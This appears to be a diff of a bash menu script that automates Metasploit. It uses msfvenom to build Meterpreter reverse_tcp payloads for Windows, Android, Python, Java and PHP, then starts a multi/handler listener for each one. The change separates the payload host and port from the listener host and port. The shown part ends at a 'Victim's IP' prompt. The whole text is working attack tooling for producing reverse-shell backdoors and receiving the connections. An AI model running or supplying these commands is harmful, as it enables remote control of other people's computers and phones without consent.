@@ -31,48 +31,98 @@ while true; do
   case $x in
     1)
       read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost
-      lhost=${lhost:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport
-      lport=${lport:-4444}
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /root/Desktop/$payload_name.exe
-      msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
+      read -p "Enter the payload LHOST [$ip]: " lhost_payload
+      lhost_payload=${lhost_payload:-$ip}
+      read -p "Enter the payload LPORT [4444]: " lport_payload
+      lport_payload=${lport_payload:-4444}
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f exe > /root/Desktop/$payload_name.exe
+
+      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+        lhost_listener=$lhost_payload
+        lport_listener=$lport_payload
+      else
+        read -p "Enter the listener LHOST: " lhost_listener
+        read -p "Enter the listener LPORT: " lport_listener
+      fi
+
+      msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
       ;;
     2)
       read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost
-      lhost=${lhost:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport
-      lport=${lport:-4444}
-      msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport > /root/Desktop/$payload_name.apk
-      msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
+      read -p "Enter the payload LHOST [$ip]: " lhost_payload
+      lhost_payload=${lhost_payload:-$ip}
+      read -p "Enter the payload LPORT [4444]: " lport_payload
+      lport_payload=${lport_payload:-4444}
+      msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload > /root/Desktop/$payload_name.apk
+
+      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+        lhost_listener=$lhost_payload
+        lport_listener=$lport_payload
+      else
+        read -p "Enter the listener LHOST: " lhost_listener
+        read -p "Enter the listener LPORT: " lport_listener
+      fi
+
+      msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
       ;;
     3)
       read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost
-      lhost=${lhost:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport
-      lport=${lport:-4444}
-      msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport > /root/Desktop/$payload_name.py
-      msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
+      read -p "Enter the payload LHOST [$ip]: " lhost_payload
+      lhost_payload=${lhost_payload:-$ip}
+      read -p "Enter the payload LPORT [4444]: " lport_payload
+      lport_payload=${lport_payload:-4444}
+      msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload > /root/Desktop/$payload_name.py
+
+      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+        lhost_listener=$lhost_payload
+        lport_listener=$lport_payload
+      else
+        read -p "Enter the listener LHOST: " lhost_listener
+        read -p "Enter the listener LPORT: " lport_listener
+      fi
+
+      msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
       ;;
     4)
       read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost
-      lhost=${lhost:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport
-      lport=${lport:-4444}
-      msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f jar > /root/Desktop/$payload_name.jar
-      msfconsole -q -x "use exploit/multi/handler; set payload java/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
+      read -p "Enter the payload LHOST [$ip]: " lhost_payload
+      lhost_payload=${lhost_payload:-$ip}
+      read -p "Enter the payload LPORT [4444]: " lport_payload
+      lport_payload=${lport_payload:-4444}
+      msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f jar > /root/Desktop/$payload_name.jar
+
+      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+        lhost_listener=$lhost_payload
+        lport_listener=$lport_payload
+      else
+        read -p "Enter the listener LHOST: " lhost_listener
+        read -p "Enter the listener LPORT: " lport_listener
+      fi
+
+      msfconsole -q -x "use exploit/multi/handler; set payload java/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
       ;;
     5)
       read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost
-      lhost=${lhost:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport
-      lport=${lport:-4444}
-      msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport > /root/Desktop/$payload_name.php
-      msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
+      read -p "Enter the payload LHOST [$ip]: " lhost_payload
+      lhost_payload=${lhost_payload:-$ip}
+      read -p "Enter the payload LPORT [4444]: " lport_payload
+      lport_payload=${lport_payload:-4444}
+      msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload > /root/Desktop/$payload_name.php
+
+      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+        lhost_listener=$lhost_payload
+        lport_listener=$lport_payload
+      else
+        read -p "Enter the listener LHOST: " lhost_listener
+        read -p "Enter the listener LPORT: " lport_listener
+      fi
+
+      msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
       ;;
     6)
       echo "Victim's IP:"
